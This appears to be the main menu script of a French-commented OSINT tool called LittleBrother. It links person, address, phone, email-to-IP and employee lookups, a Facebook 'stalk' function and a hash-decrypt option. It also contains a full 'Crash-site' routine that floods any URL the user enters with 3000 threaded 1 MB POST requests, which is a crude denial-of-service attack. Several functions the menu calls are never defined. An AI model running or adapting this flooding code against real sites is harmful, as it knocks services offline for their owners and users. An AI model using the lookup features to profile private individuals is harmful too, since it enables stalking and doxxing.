#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
import time
import threading
import requests
from colorama import Fore, init
from lib.menu import checkVersion, clear, menu
from lib.loading import thread_loading
from core.searchEmail import SearchEmail
from core.searchPersonne import searchPersonne
from core.searchAdresse import searchAdresse
from core.searchUserName import searchUserName
from core.ipFinder import ipFinder
from core.bssidFinder import bssidFinder
from core.mailToIP import mailToIP
from core.employee_lookup import employee_lookup
from core.google import google
from core.facebookStalk import facebookStalk
from core.searchTwitter import searchTwitter
from core.searchInstagram import searchInstagram
from core.profilerFunc import profilerFunc
from core.searchNumber import searchNumber
from core.hashDecrypt import hashdecrypt
from txt.help import *
import settings

# Initialisation de colorama
init()

# Vérification de la version et démarrage du loading
checkVersion()
thread_loading()

# Variables de couleur pour affichage
warning = "[" + Fore.RED + "!" + Fore.RESET + "]"
question = "[" + Fore.YELLOW + "?" + Fore.RESET + "]"
information = "[" + Fore.BLUE + "I" + Fore.RESET + "]"
wait = "[" + Fore.MAGENTA + "*" + Fore.RESET + "]"
found = "[" + Fore.GREEN + "+" + Fore.RESET + "]"
tiret = "[" + Fore.CYAN + "-" + Fore.RESET + "]"

# Configurations globales
MAX_REQUESTS = 3000  # Limite de requêtes de 3000 pour l'option 6
REQUEST_DELAY = 0.5  # Délai entre requêtes

# Menu principal
mainOption = """
 [1] Lookup
 [2] Other Tool
 [3] Profiler
 [4] Change Country
 [5] Load Test
 [6] Crash-site (envoi de 3000 requêtes avec paquets lourds)
 [7] Big Server Test
 [8] Change Country
 [e] Exit Script    [h] Help Message    [c] Clear Screen"""

# Fonction pour envoyer des requêtes avec un payload très lourd (1 Mo)
def heavy_request(url):
    try:
        large_payload = "A" * (1024 * 1024)  # 1 Mo de données
        headers = {'User-Agent': 'Mozilla/5.0'}
        response = requests.post(url, 
                                 data=large_payload, 
                                 headers=headers,
                                 timeout=10)
        print(f"Requête envoyée avec {len(large_payload)} bytes → {response.status_code}")
    except Exception as e:
        print(f"Erreur: {str(e)}")

# Fonction pour le "Crash-site" avec 3000 requêtes
def crash_site_test():
    url = input("Entrez l'URL du site à tester (http:// ou https://) : ").strip()
    
    if not url.startswith(('http://', 'https://')):
        print("URL invalide. Assurez-vous d'inclure 'http://' ou 'https://'.")
        return

    confirmation = input(f"Vous allez envoyer {MAX_REQUESTS} requêtes avec des paquets lourds vers {url}. Êtes-vous sûr(e) ? (O/N) : ").strip().upper()

    if confirmation == "O":
        print(f"\nDébut de l'envoi de {MAX_REQUESTS} requêtes avec des paquets lourds vers {url}.")
        for i in range(MAX_REQUESTS):
            thread = threading.Thread(target=heavy_request, args=(url,))
            thread.start()
            time.sleep(REQUEST_DELAY)
    else:
        print(f"{warning} Opération annulée.")

# Menu principal
def main_menu():
    clear()
    menu()
    print(mainOption)

    while True:
        choix = input("\n LittleBrother(" + Fore.BLUE + "~" + Fore.RESET + ")$ ")

        if choix.lower() == 'h':
            print(helpMain)
        elif choix.lower() == 'c':
            clear()
            menu()
            print(mainOption)
        elif choix == '6':  # Crash-site avec 3000 requêtes lourdes
            crash_site_test()
        elif choix == '7':  # Big Server Test
            big_server_test()
        elif choix == '8':  # Changer de pays
            change_country()
        elif choix == '5':  # Test de charge
            load_test()
        elif choix == '1':  # Option Lookup
            lookup_menu()
        elif choix == '2':  # Autre outil
            other_tool_menu()
        elif choix == '3':  # Profiler
            profiler_menu()
        elif choix.lower() == 'e':
            sys.exit("\n" + information + " Bye! :)")
        else:
            pass

# Fonction de Lookup Menu
def lookup_menu():
    clear()
    menu()
    print(lookupOption)

    while True:
        lookup = input("\n LittleBrother(" + Fore.BLUE + "Lookup" + Fore.RESET + ")$ ")
        if lookup == 'h':
            print(helpLookup)
        elif lookup.lower() == '1':
            searchPersonne(settings.codemonpays)
        elif lookup.lower() == '2':
            searchUserName()
        elif lookup.lower() == '3':
            searchAdresse(settings.codemonpays)
        elif lookup.lower() == '4':
            searchNumber(settings.codemonpays)
        elif lookup.lower() == '5':
            ipFinder()
        elif lookup.lower() == '6':
            bssidFinder()
        elif lookup.lower() == '7':
            SearchEmail()
        elif lookup.lower() == '8':
            mailToIP()
        elif lookup.lower() == '9':
            employee_lookup()
        elif lookup.lower() == '10':
            google()
        elif lookup.lower() == "11":
            facebookStalk()
        elif lookup.lower() == "12":
            searchTwitter()
        elif lookup.lower() == "13":
            searchInstagram()
        elif lookup.lower() == "b":
            clear()
            menu()
            print(mainOption)
            break
        elif lookup.lower() == "c":
            clear()
            menu()
            print(lookupOption)
        elif lookup == '':
            pass
        elif lookup.lower() == "e":
            sys.exit("\n" + information + " Bye! :)")
        else:
            pass

# Menu Autre Outil
def other_tool_menu():
    clear()
    menu()
    print(otherToolOption)

    while True:
        se = input("\n LittleBrother(" + Fore.BLUE + "Other Tool" + Fore.RESET + ")$ ")
        if se == 'h':
            print(helpOtherTool)
        elif se.lower() == '1':
            hashdecrypt()
        elif se.lower() == 'b':
            clear()
            menu()
            print(mainOption)
            break
        elif se.lower() == 'c':
            clear()
            menu()
            print(otherToolOption)
        elif se == '':
            pass
        elif se.lower() == 'e':
            sys.exit("\n" + information + " Bye! :)")
        else:
            pass

# Menu Profiler
def profiler_menu():
    clear()
    menu()
    print(profilerOption)

    while True:
        pf = input("\n LittleBrother(" + Fore.BLUE + "Profiler" + Fore.RESET + ")$ ")
        if pf == 'h':
            print(helpProfiler)
        elif pf.lower() == '1':
            profilerFunc()
        elif pf.lower() == '2':
            profilerFunc(show_all=True)
        elif pf.lower() == '3':
            profilerFunc(create=True)
        elif pf.lower() == 'b':
            clear()
            menu()
            print(mainOption)
            break
        elif pf.lower() == 'c':
            clear()
            menu()
            print(profilerOption)
        elif pf == '':
            pass
        elif pf.lower() == 'e':
            sys.exit("\n" + information + " Bye! :)")
        else:
            pass

if __name__ == "__main__":
    main_menu()
